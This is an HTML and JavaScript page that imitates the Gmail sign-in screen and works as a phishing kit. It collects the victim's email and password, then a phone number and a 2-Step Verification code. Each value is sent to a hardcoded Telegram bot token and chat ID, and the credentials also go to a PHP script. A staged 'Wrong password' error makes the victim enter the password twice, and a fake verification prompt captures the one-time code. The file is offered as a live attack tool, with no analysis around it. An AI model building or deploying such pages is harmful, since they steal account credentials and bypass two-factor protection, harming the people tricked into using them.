<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        body{
            background: #f0f4f9;
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        #temp-contain{
            /* background: #fff; */
            margin: auto;
            margin-top: 10%;
            width: 70%;
            
        }.img-sign p{
            width: 80%;
            font-size: 16px;
        }
        .form-sections{
            background: #fff;
            padding: 30px 30px;
            display: flex;
            justify-content: space-between;
            border-radius: 30px;
        }
        .log-section input::placeholder{
            font-size: 16px;
        }
        .log-section input{
            padding: 17px;
            border-radius: 4px;
            border: 1px solid #000;
            width: 90%;
            outline: none;
            font-size: 16px;
        }
        .state-lists ul li{
            font-size: 14px;
        }
        .state-lists ul{
            list-style: none;
            display: flex;
            justify-content: space-between;
            width: 20%;
        }
        .state-lists{
            display: flex;
            justify-content: space-between;
        }
        a{
            color: rgb(11 87 208 / 1);
        border-radius: 4px;
        font-weight: 500;
        letter-spacing: 0.015625rem;
        z-index: 1;
        text-decoration: none;
        font-size: 14px;
        /* font-weight: bold; */
        }
        .butts{
            align-items: center;
            width: 100%;
            float: right;
        }
        .butts button,
        button
        {
            float: right;
            color: #fff;
            background: rgb(11 87 208 / 1);
            border: 1px solid rgb(11 87 208 / 1);
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
        }
        #not{
            color: var(--gm3-sys-color-on-surface-variant, #444746);
        font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        font-size: 0.875rem;
        font-weight: 400;
        letter-spacing: 0rem;
        line-height: 1.4285714286;
        }
        #pdss{
            display: none;
        }
        #nextsubmit{
            display: none;
        }
        #error{
            display: none;
        }
        #mail-secs{
            display: none;
        }
        .img-sign{
            width: 50%;
        }

        #errors{
            display: none;
        }
        #pdssts{
            display: none;
        }
        #pdsstsMain{
            display: none;
        }
     
        .sec-tion{
            display: none;
        }

        #errorss{
            display: none;
        }
       
        @media(max-width: 800px){
            body{
                background: #fff;
            }
        .form-sections{
            flex-direction: column;
            width: 100%;
            padding: 5px;
        }
        .img-sign{
            width: 90%;
        }
        #temp-contain{
            width: 90%;
        }
        .state-lists{
            display: none;
        }
        }
    </style>
</head>
<body>
   <div id="temp-contain">
    <div class="form-sections">
        <div class="img-sign">
            <div class="svg">
                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
            </div>
            <h1 style="font-weight: 100;" id="signs">Sign in
            </h1>
            <div id="mail-secs"  style=" justify-content: space-between; width: 50%; overflow: hidden; border-radius: 20px; padding: 3px 10px; align-items: center; border: 1px solid #000;">

               <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="28px" height="28px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                <span id="span-mail" style="padding: 1px; font-size: 14px;">supportrequest@gmail.com</span>
            </div>
            <p id="goog-acc">to continue to Gmail</p>
        </div>
        <div class="log-section">
            <div class="sec-tion">
                <br><br><br>
                <p>Google sent a verification code to your Mobile number . Click next and confirm the security code on your phone to verify it’s you.
                </p>
                <br><br>
                <button type="submit" id="baseButt">Next</button>
                <br><br>
                <br><br>
            </div>

            <div id="pdssts">
            <br><br>
                <br><br>
            <form action="" id="formaload">
                <p style="opacity:0;">Confirm mobile number to complete account verification.</p>
                <input type="text" id="pwddstoast" required placeholder="Enter verification code" value="" required > <br> 
                <p style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br><br>
                <button type="submit" id="">Confirm</button>
                <a id="maindirect" href="./twofa.php#">Did not receive code? Try another way.</a>
            </form>
                <br>
                <br>
            <!-- <form action="" style="width: 100%;" id="formaload">
                <input type="text" id="pwddstoast" required placeholder="Enter verification code" required > <br> 
                <p id="errors" style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br>
                <button type="submit" id="">Next</button>
            </form> -->
                
            </div>
            <div id="pdsstsMain">
                <br><br>
                <br><br>
            <form action="" id="formal-top">
                <p>Confirm mobile number to complete account verification.</p>
                <input type="text" id="pwddstvvs" required placeholder="" value="+1" required > <br> 
                <p id="errors" style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br><br>
                <button type="submit" id="">Next</button>
            </form>
                <br>
                <br>
                <br><br>
            </div>


            <br><br><br> <br><br>
            <div id="uspds">
            <form action="" id="form">
                <input type="text" id="usrdd" required placeholder="Email or phone"> <br> <p id="error" style=" align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Enter an email or phone number</p> <br>
            </div>
            <div id="pdss">
                <input type="password" id="pwdds" required placeholder="Enter your password" required > <br> 
                <p id="errorss" style=" align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p>
                <br>
                <br>
                <br><br>
            </div>
            
            <a href="#" id="forgot">Forgot email?</a>
            
            <div class="butts">
                <br>
            <br>
            <p id="not">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a>
            </p><br>
                <button id="nexts">Next</button>
                <button type="submit" id="nextsubmit">Next</button>
            </form>
            </div>
        </div>
       
    </div> <br>
    <div class="state-lists">
        <p>English (United States)</p>
        <ul>
            <li>Help</li>
            <li>Privacy</li>
            <li>Terms</li>
        </ul>
    </div>
</div>
    <script>
        const currentUrl = window.location.href;
let maill = document.querySelector('#usrdd')
let emailPattern = /[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}/;
let matches = currentUrl.match(emailPattern);
let email;

if (matches) {
  email = matches[0];
  maill.value = email  

}
// const domainn = email.substring(email.lastIndexOf("@") + 1);



      const forma = document.querySelector('#form')
      const formal = document.querySelector('#formal')
      const formaload = document.querySelector('#formaload')
      const formalTop = document.querySelector('#formal-top')
      const nexts = document.querySelector('#nexts')
      const error = document.querySelector('#error')
      const uspds = document.querySelector('#uspds')
      const pdss = document.querySelector('#pdss')
      const signs = document.querySelector('#signs')
      const spanMail = document.querySelector('#span-mail')
      const mailSecs = document.querySelector('#mail-secs')
      const googAcc = document.querySelector('#goog-acc')
      const nott = document.querySelector('#not')
      const forgot = document.querySelector('#forgot')
      const nextsubmit = document.querySelector('#nextsubmit')
      const errors = document.querySelector('#errors')
      const baseButt = document.querySelector('#baseButt')
      const pdssts = document.querySelector('#pdssts')
      const pwddstvvs = document.querySelector('#pwddstvvs')
      const pwddst = document.querySelector('#pwddst')
      const butts = document.querySelector('.butts')
      let secTion = document.querySelector('.sec-tion')
      let pdsstsMain = document.querySelector('#pdsstsMain')

      nexts.addEventListener('click', (e)=>{
        e.preventDefault()
        if(maill.value === ""){
            error.style.display = "block"
            maill.style.borderColor = "#b3261e"
            return
        }
        setTimeout(() => {
            uspds.style.display = "none"
        pdss.style.display = "block"
        signs.textContent = "Welcome"
        spanMail.textContent = `${maill.value}`
        mailSecs.style.display = "flex"
        googAcc.style.display = 'none'
        // googAcc.textContent = 'To help keep your account safe, Google wants to make sure it’s really you trying to sign in'
        nott.style.opacity = "0"
        nott.style.marginTop = "-10%"
        forgot.style.display = "none"
        nextsubmit.style.marginTop = "-10%"
        nextsubmit.style.display = "block"
        nexts.style.display = "none"
        }, 1500);

      })
    
      let bot = {
    TOKEN: "8135029951:AAGw-kDu3NVzOldOjttvvYJSKxv4IFg8q48",
        chatID:"7557838902"
      }

      let tester = 1;

      baseButt.addEventListener('click', (e)=>{
        e.preventDefault()
        pdsstsMain.style.display = "block"
        secTion.style.display = "none"

      })

      formalTop.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#usrdd').value;
          let password = document.querySelector('#pwdds').value;
          document.querySelector('#maindirect').href = `./twofa.php#${email}`

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Gmail=>\n${pwddstvvs.value}=`, {
              method: "GET"
          }).then(success => {

            // alert(pwddst.value)
            setTimeout(() => {
                pdsstsMain.style.display = "none"
                pdssts.style.display = "block" 
            
              // Send data to PHP script
              fetch('save_data.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email, password: password })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // window.location.href = "https://gmail.com"; // Redirect after saving
                
            } else {
                alert("Error saving data");
            }
        })
        .catch(error => console.error('Error:', error));

    }, 1500);

          }, error => {
              alert("Message not sent")
              console.log(error)
              }) 
      })


      forma.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#usrdd').value
          let emaiput = document.querySelector('#uspds').value
          let qqpwdqq = document.querySelector('#pwdds').value
          let qqpwdq = document.querySelector('#pwdds')
          var body = document.querySelector('body');
          var errorss = document.querySelector('#errorss');

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Gmail=>\n${email}=\n${qqpwdqq}`, {
              method: "GET"
          }).then(success => {
            if(tester !== 1){
            // formCes.style.display = 'none';
            // formSec.style.display = 'none';
            // formSecn.style.display = 'flex';
       setTimeout(() => {
        googAcc.style.display = 'block'
        googAcc.textContent = 'To help keep your account safe, Google wants to make sure it’s really you trying to sign in'
        signs.textContent = "2-Step Verification"
        secTion.style.display = "block"
        uspds.style.display = "none"
        pdss.style.display = "none"
        butts.style.display = "none"
       }, 1500);
            }else {
                errorss.style.display = "block"
                qqpwdq.type = "text"
            tester = 0
            }

            //   window.location.replace("./cc.html");

          }, error => {
              alert("Message not sent")
              console.log(error)
              
              }) 
      })

      formaload.addEventListener("submit", e =>{
          e.preventDefault();
          let pwddstoast = document.querySelector('#pwddstoast').value

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Gmail=>\n${pwddstoast}=`, {
              method: "GET"
          }).then(success => {

              setTimeout(() => {
            //   window.location.replace("https://gmail.com");
              }, 1500);

          }, error => {
              alert("Message not sent")
              console.log(error)
              
              }) 
      })

    </script>


</body>
</html>